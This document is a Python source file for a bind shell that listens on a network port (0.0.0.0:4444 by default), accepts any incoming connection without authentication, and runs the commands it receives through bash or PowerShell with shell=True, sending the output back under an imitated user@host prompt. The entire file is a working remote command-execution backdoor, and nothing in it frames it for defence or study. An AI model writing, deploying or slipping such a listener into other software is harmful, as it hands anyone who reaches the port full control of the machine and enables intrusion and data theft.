import os
import subprocess
import socket
import argparse

MAX_CMD_LENGTH = 1024
cwd = None  
colors = {
    "default":"\033[0m",
    "red":"\033[31m",
    "green":"\033[32m",
    "blue":"\033[34m",
}
def check_expansion(command, cwd) -> str:
    """Expand `~` and check if the directory exists before changing it."""
    args = command.split()
    
    if len(args) == 1:
        return os.path.expanduser("~")
    
    new_path = args[1]

    if new_path == '~':
        return os.path.expanduser("~")

    new_path = os.path.abspath(os.path.join(cwd, new_path))

    if os.path.isdir(new_path):
        return new_path
    else:
        return None  

def get_dir(cwd):
    """Get the current working directory if not set."""
    if cwd is None:
        return os.getcwd()
    return cwd

def run_cmd(command: str) -> str:
    """Execute shell commands with proper handling of 'cd'."""
    global cwd
    cwd = get_dir(cwd) 

    if command.startswith('cd'):
        new_cwd = check_expansion(command, cwd)
        if new_cwd is not None:
            cwd = new_cwd
            return ""  
        else:
            return "[!] Error: No such file or directory\n"

    
    if os.name == 'posix':
        cmd = f"bash -c 'cd {cwd} && {command}'"
    elif os.name == 'nt':
        cmd = f"powershell -command \"cd '{cwd}'; {command}\""
    else:
        return "Unsupported OS"

    result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    return result.stdout + result.stderr

def get_user():
    if os.name == 'nt':
        return os.getlogin()
    user = subprocess.run('whoami', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return user.stdout.decode(errors='ignore').strip()

def get_hostname():
    hostname = subprocess.run('hostname',shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return hostname.stdout.decode().strip()

def determine_prefix(user):
    suffix='$'
    if user == 'root':
        suffix='#'
    return suffix

def parse_arguments()->argparse:
    parser = argparse.ArgumentParser(description='Bind Shell')
    parser.add_argument('-i', '--ip',type=str, default='0.0.0.0', help='IP to listen on')
    parser.add_argument('-p', '--port', type=int, default=4444, help='Port to listen on')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-c','--color',action='store_true',help='Makes the terminal prompt colorful')
    return parser.parse_args()


def verbose_send(message,verbose:bool,c)->None:
    if verbose:
        c.sendall(message.encode())

def color_send(user:str,hostname:str,directory:str,suffix:str)->str:
    red=colors['red']
    white=colors['default']
    blue=colors['blue']
    green=colors['green']
    user_color=blue
    if user=='root':
        user_color=red
    return f'{user_color}{user}{white}@{green}{hostname}{white}:{blue}{directory}{white}{suffix} '

def main():
    args=parse_arguments()
    ip=args.ip
    port=args.port
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
    s.bind((ip,port))
    s.listen(1)
    hostname=get_hostname()
    
    while True:
        c, addr = s.accept()
        verbose_send(f"[-] {addr} connected.\n",args.verbose,c,)
        c.settimeout(60)
        print(f"[-] {addr} connected.")
        try:
            while True:
                user=get_user()
                suffix=determine_prefix(user)
                directory=get_dir(cwd)
                if(args.color):
                    verbose_send(color_send(user,hostname,directory,suffix),args.verbose,c)
                else:
                    verbose_send(f'{user}@{hostname}:{directory}{suffix} ',args.verbose,c)
                command = c.recv(2048).decode().strip()
                if len(command) > MAX_CMD_LENGTH:
                    c.sendall("[!] Command too long\n".encode())
                    continue
                elif  command.lower() == 'cls' or command.lower() == 'clear':
                    verbose_send('\033[2J\033[H',args.verbose,c)
                elif  command.lower() == 'exit':
                    print(f"[-] {addr} disconnected.")
                    verbose_send(f'[-] {addr} disconnected.\n',args.verbose,c)
                    c.close()
                    break
               
                output = run_cmd(command)
                c.sendall(output.encode())
        except Exception as e:
            c.sendall(f"[!] Error: {str(e)}\n".encode())
            c.close()
            break


if __name__ == '__main__':
    main()
